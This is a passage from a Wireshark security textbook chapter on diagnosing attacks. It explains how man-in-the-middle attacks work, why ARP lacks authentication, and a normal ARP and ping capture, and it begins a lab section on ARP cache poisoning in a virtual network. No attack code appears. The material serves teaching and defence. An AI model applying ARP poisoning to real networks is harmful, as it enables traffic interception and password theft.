<div class="Section189" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1 style="margin-right:240.4500pt;" ><a name="Chapter 5: Diagnosing Attacks" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><a name="_bookmark368" ></a><a name="_bookmark367" ></a>Chapter 5 Diagnosing Attacks</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:15.3500pt;margin-right:11.1500pt;" ><a name="_bookmark369" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In this chapter, we use Wireshark to identify and diagnose attacks. At the external face of your network, attacks are happening constantly, and often internally, so you don&#8217;t get a chance to let down your guard anywhere. Therefore, it is valuable to learn one more method to spot and analyze them.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Attacks vary in many ways&#8212;for example, in technique, origin, difficulty to launch, how &#8220;noisy&#8221; they are, and the intended goal, to name a few. Perhaps, for security professionals, the most important point is the impact felt (or not felt) from a successful attack.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Does this chapter sample the whole range of attacks? No, it can&#8217;t. There are dozens of new attacks every day, and there will be hundreds more to come until this chapter is published. Although it&#8217;s impossible to show a significant sample of what&#8217;s out there, we do explain the different types in the context of Wireshark. We explore each example in terms of how Wireshark can positively identify an attack. Of course, as an analysis tool, Wireshark isn&#8217;t the best tool for early detection as much as for confirmation.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark shines when it comes to confirming what&#8217;s detected or suspected. Some real-world attacks will prompt you for Wireshark to confirm what an IDS suspects to decide between malicious traffic and a false flag. For other disruptive attacks, you might start Wireshark to confirm what will already be painfully obvious.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><a name="_bookmark370" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This chapter discusses man-in-the&#8211;middle (MitM), denial-of-service (DoS), and advanced persistent threat (APT) attacks. Together, these types cover the large majority of attacks while also offering a fair spectrum of how attacks vary.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:7.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We begin with introducing the attack, explaining why it is effective and at least one method of how it gets done. We then discuss how the attack might be prevented. With some of the attacks, namely the MitM</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section190" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >attacks, we also delve more into the mechanics of the respective protocol. For most of these attacks, you will read an example as well as be able to reproduce it. We show at least one example by text, highlighting the packets and their impact.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:8.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Lastly, the W4SP Lab plays heavily into the chapter, primarily with the MitM attacks. MitM attacks were briefly mentioned in an earlier chapter, but are discussed in much greater depth in this chapter. To refresh, MitM attacks are a type of attack when the attacker intercepts traffic between systems, then masquerades as one or more of those systems. Attackers can wage a MitM attack exploiting a variety of protocols, to achieve the same end: controlling or intercepting traffic as an intermediary system. In this chapter, you will personally get to conduct these attacks first-hand in the W4SP Lab.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Attack Type: Man-in-the-Middle" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark371" ></a>Attack Type: Man-in-the-Middle</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The MitM attack is a special category of attack. We go over a few other attack types in this chapter, but we&#8217;ll say here that, of all kinds of attacks, MitM is the one kind that conveys some sense of place or position&#8212;the middle.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The MitM attack is like a spy. The attack secretly intercepts or relays traffic between two other systems or networks. The attacker operates, unknown, between the two parties&#8212;hence, the &#8220;middle man.&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Technically, thanks to routing, a MitM attack doesn&#8217;t require you to be literally in the middle, between the two systems. And when it comes to modern network topologies and technologies, there&#8217;s no real physical middle to a network anyway. In fact, you could perform a MitM attack on two systems much closer to each other than you are to either one of them. So, what&#8217;s the &#8220;middle&#8221; mean?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The middle means you can perform certain actions to fool one or both of those parties to believe you are one of them.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As<a name="_bookmark372" ></a>&nbsp;</span><span><a href="#_bookmark373" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-1</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >illustrates, both parties believe they are speaking directly to each other, as expected. In reality, however, the attacker is controlling or at least monitoring the traffic between them.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section191" ><p class=MsoBodyText  style="margin-left:49.2500pt;" ><img width="643"  height="455"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker247847.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark373" ></a><span><a href="#_bookmark372" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-1:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Man-in-the-middle position</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Why MitM Attacks Are Effective</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Man-in-the-middle attacks work well because of a lack of authentication. It is simply not feasible or practical to use authentication for every handshake, every session, and every query/response exchange. Hence, there will always be a <a name="_bookmark374" ></a>risk of traffic being intercepted. The only mitigating condition is how far apart the server and client are for those exchanges. A query/response exchange on the same local subnet is a far safer exchange than an exchange across several hops. But even at the smallest level, at the local machine, traffic and data can be intercepted. (As security professionals, you already appreciate the risks of a rootkit.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:7.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >So, whether traffic travels across the room, across the parking lot, or across the globe, the risk of a MitM attack is present. That&#8217;s in a general sense. Now let&#8217;s get down to the &#8220;how&#8221; for particular protocols.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >How MitM Attacks Get Done: ARP</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >First, a few sentences as a refresher on what ARP is and how it works</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section192" ><p class=MsoBodyText  style="margin-top:4.0500pt;margin-right:8.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >normally. ARP, the Address Resolution Protocol, is how systems determine the hardware or MAC address for a given IP address. Normally, when a packet is routed to the target subnet, the incoming switch forwards the packet to the target machine. One of two things happens: either the switch already knows which port to send the packet out of, or it needs to find out. To find out, the switch broadcasts out all its ports, &#8220;</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Who has this IP address? And what is your layer 2 address?</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.6500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >ARP Protocol Walkthrough</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The ARP protocol is a simple two-step process beginning with an ARP request sent by the switch, followed by an ARP response from the target system. Given the ARP response, the switch forwards the IP packet out the correct switch port, <a name="_bookmark375" ></a>and adds the ARP entry to its cache. The entry in the switch&#8217;s cache saves time from having to broadcast a query again. That&#8217;s the way ARP works normally.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:9.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Already, the vulnerability is clear. </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Anyone </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >could send the response back, claiming they are the requested IP address, forwarding their</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >own hardware address for receiving the local packets. Better still, why wait for the broadcast request? If a malicious user sends an unsolicited ARP response to the switch, to politely give the heads up about its MAC address, that is perfectly fine by ARP standard RFC</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >826.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Most ARP cache implementations have a timeout that determines when the machine should send an ARP request for entries already in the cache to refresh them. For example, in Windows 7 the timeout for when an ARP entry is marked stale, and therefore triggering an ARP request to update the entry, is between 15 and 45 seconds. It varies because the ARP timeout is determined per entry by multiplying a random number against a base time.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.9500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >ARP Weaknesses</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There are inherent weaknesses in ARP. The vulnerabilities in ARP are not necessarily flaws in how the protocol works, but they certainly leave the protocol defenseless. Because of these vulnerabilities, the ARP protocol, as it&#8217;s designed, will stay exploitable.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section193" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:13.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For starters, ARP is stateless, meaning there is no sustained knowledge or some kept &#8220;session.&#8221; In short, every ARP request and response is treated independently. This trait is no different from IP or HTTP or other stateless protocols. Again, this is not a design flaw but just the nature of the protocol.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:8.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The trait that more enables attack is that ARP requires no authentication. Because ARP replies are accepted without authentication, there is no way to differentiate between those from legitimate and malicious sources. This is the case whether the malicious MAC address comes from an ARP reply or a gratuitous ARP, one sent without being prompted by ARP request.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Lastly, for some operating systems, in the case of a conflict (multiple MAC addresses for one IP address), the first ARP response&#8212;and only the first received response&#8212;will be accepted. In other words, if you can be the first, you can be legit. That conflict is expected, given the victim machine is still functional and able to respond as well. For most other operating systems, the last ARP reply is the one that sticks.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After you understand the mechanics of how ARP works and how its vulnerabilities factor into an attack, then you understand how simple it is to exploit.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Demonstrating Normal ARP</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To demonstrate ARP in use, let&#8217;s ping a host on the network. In this case, we are going to ping the IP address 10.0.2.2. This example and the figures captured for the book were done using the VirtualBox NAT networks created in </span><span><a href="#_bookmark56" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. <a name="_bookmark376" ></a>We start Wireshark to capture the ping traffic to 10.0.2.2, but the first packets are not the ICMP packet itself but rather the ARP packets to find out where our target is.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Here is what happens:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7500pt;margin-right:42.9000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l21 level1 lfo12;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the first packet, the source machine sent an ARP</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >broadcast, asking the question, &#8220;Who has the 10.0.2.2 IP</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.8000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >address?&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.5500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l21 level1 lfo12;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the second packet, the gateway responds with the message,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.6500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8220;The</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >10.0.2.2 IP address is at 52:54:00:12:35:02.&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l21 level1 lfo12;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Packets 3 through 10 show ICMP ping requests and</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >replies</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section194" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >between the source (10.0.2.2) and target (10.0.2.15) machines.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you notice, there is a time delay between some of the ICMP packets in<a name="_bookmark377" ></a>&nbsp;</span><span><a href="#_bookmark378" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. What happened here is the ping request stopped and started again.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="780"  height="307"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker253194.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.1500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark378" ></a><span><a href="#_bookmark377" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-2:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Ping and ARP transaction</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you check the ARP cache, you will see that there is an entry for the</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >10.0.2.2 address.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >root@ncckali:~# ip neigh show</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-left:30.5000pt;line-height:145%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >10.0.2.2 dev eth0 lladdr 52:54:00:12:35:02 REACHABLE root@ncckali:~#</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Referring back to </span><span><a href="#_bookmark378" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 5-2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, note that for the subsequent ping requests, the machine is indeed using the ARP cache and did not have to broadcast ARP requests every time.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.0500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >W4SP Lab: Performing an ARP MitM Attack</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When it comes to learning, doing is far better than just reading about it. This is why the W4SP Lab was created. Most books that deal with network analysis have you loading up canned pcaps or running through hypothetical scenarios. <a name="_bookmark379" ></a>Not in this book. We have developed an entire virtual network for you to cut your teeth on. It includes a lot of similar traffic that you will see in real-world production networks, like SMB, DHCP, FTP, HTTP, VRRP, OSPF, and the list goes on. To</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section195" ><p class=MsoBodyText  style="margin-top:3.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >top it all off, we even have emulated client devices that make performing MitM attacks as realistic as possible, allowing you to steal passwords like the pros, all without breaking any laws.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >One of the labs you can do in the W4SP Lab is a MitM attack using (abusing) the ARP protocol. In this lab, we want to poison the ARP cache of a local system to believe our attacker system is the target&#8217;s gateway. When the target is sending packets to its gateway, the packets will instead be received by our interface. Let&#8217;s walk though it here.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Lab Setup Refresher</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you&#8217;ve been reading this book over time, jumped to this chapter, or haven&#8217;t launched the W4SP Lab in a while, here is a quick refresher on how to start the W4SP Lab:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.6500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l5 level1 lfo13;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >On your desktop/server, start Oracle</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >VirtualBox.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l5 level1 lfo13;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span 